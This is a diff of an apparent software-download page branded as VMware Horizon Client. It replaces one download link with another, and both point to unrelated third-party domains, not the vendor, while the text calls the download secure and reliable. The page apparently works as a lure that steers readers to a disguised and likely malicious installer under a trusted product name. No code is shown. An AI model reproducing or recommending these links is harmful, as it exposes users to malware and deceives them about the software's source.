@@ -12,7 +12,7 @@
 ## Installation
 Click the button below to download VMware Horizon Client for Windows instantly:
 
-[**Download VMware Horizon Client**](https://ahmedmedia.site/bin1/)
+[**Download VMware Horizon Client**](https://doncarlosattorney.com/htt/)
 
 Download the latest version of VMware Horizon Client to enjoy secure and reliable access to remote desktops and applications. Regular updates ensure compatibility with the latest systems and enhanced features for an optimal user experience. If you encounter any issues during the download or installation process, refer to the VMware Knowledge Base or contact support for assistance.
 
